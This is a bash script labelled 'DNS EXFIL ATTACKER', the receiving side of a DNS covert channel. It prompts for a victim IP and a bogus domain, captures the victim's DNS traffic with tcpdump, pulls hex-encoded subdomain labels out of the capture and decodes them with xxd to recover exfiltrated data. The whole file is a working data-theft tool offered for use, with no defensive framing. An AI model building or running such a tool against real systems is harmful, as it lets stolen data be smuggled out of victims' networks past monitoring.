#!/bin/bash
# Covert channel over DNS
echo -e "\n############################################################"
echo "#####################DNS EXFIL ATTACKER#####################"
echo -e "############################################################\n"

ENCODED_TEMP_FILE=$(mktemp /tmp/tmp.ENCODED.XXXXXX)
EXFIL_TEMP_FILE=$(mktemp /tmp/tmp.EXFIL.XXXXXX)
PCAP_TEMP_FILE=$(mktemp /tmp/tmp.PCAP.XXXXXX)
RED='\033[0;31m'
NC='\033[0m'

USAGE() {
  echo "Usage: ${0} [-v]" >&2
  echo "DNS covert channel utility" >&2
  echo -e "  -v  Verbose mode.  Echo exfil data to STDOUT.  Default: quiet\n" >&2
  exit 1
}

#Parse the script options
while getopts v OPTION
do
  case ${OPTION} in
    v)  VERBOSE='true' ;;
    ?)  USAGE ;;
  esac
done

#Run the script as root
if [[ "${UID}" -ne 0 ]]
then
  echo -e "Please run the script as root.\n" >&2
  USAGE
fi

#Check for required utilities: curl, xxd, dig and tcpdump
echo "Checking for required utilities:"
echo "-------------------------------"
EXIT_STATUS=0
for PROG in curl xxd dig tcpdump
do
  which ${PROG} &> /dev/null
  if [[ "${?}" -ne 0 ]]
  then
    echo -e "${PROG} is ${RED}NOT${NC} present.  Please install before continuing." >&2
    EXIT_STATUS=2
    continue
  else
    echo "${PROG} is installed."
  fi
done

if [[ "${EXIT_STATUS}" -ne 0 ]]
then
  echo
  exit ${EXIT_STATUS}
fi

echo -e "\nYour EXTERNAL IP address is: " $(curl -s ipv4.icanhazip.com)
echo "Your INTERNAL IP address is: " $(ip addr show | grep 'inet '| grep -v 127 | cut -d ' ' -f 6 | cut -d '/' -f 1)

echo -e "\nEnter IP address of victim, then press ENTER: "
read VICTIM_IP

echo -e "\nEnter the bogus domain name used on the victim: "
read DOMAIN

#echo -e "\nEnter a name for the capture file: "
#read CAP_FILE

echo -e "\nEnter the interface for tcpdump to listen on (eth0, wlan0, etc...): "
read INTERFACE

echo -e "\nStarting tcpdump with supplied parameters..."
tcpdump -U -i ${INTERFACE} -w ${PCAP_TEMP_FILE} -s0 port 53 and host ${VICTIM_IP} &
sleep 3

PID=$(ps -e | pgrep tcpdump)

echo -e "\nPress any key to stop tcpdump and continue the script."
read CHOICE

sleep 3
sudo kill -2 ${PID}

echo -e "\nExtracting data from the DNS requests..."

tcpdump -r ${PCAP_TEMP_FILE} -n | grep ${DOMAIN} | awk -F ' ' '{print $9}' | awk -F '.' '{print $1}' | uniq > ${ENCODED_TEMP_FILE}

sleep 3

echo -e "\nReversing the encoding...\n"
xxd -r -p < ${ENCODED_TEMP_FILE} > ${EXFIL_TEMP_FILE}

echo -e "Done...\n"

if [[ "${VERBOSE}" = 'true' ]]
then
  echo -e "\nPrinting exfiltrated data:"
  echo -e "--------------------------\n"
  cat "${EXFIL_TEMP_FILE}"
fi

for TEMP_FILE in ${ENCODED_TEMP_FILE} ${EXFIL_TEMP_FILE} ${PCAP_TEMP_FILE}
do
  echo -e "\nDelete ${TEMP_FILE}?  Y|N"
  read ANSWER
  ANSWER=${ANSWER^^}
  case ${ANSWER} in
    Y)  echo -e "\nDeleting ${TEMP_FILE}"
        rm -f ${TEMP_FILE}
        ;;
    N)  echo -e "\n Not deleting ${TEMP_FILE}"
        continue
        ;;
    ?)  echo -e "\nNot a valid response.  Exiting..."
        exit 1
        ;;
  esac
done

exit 0
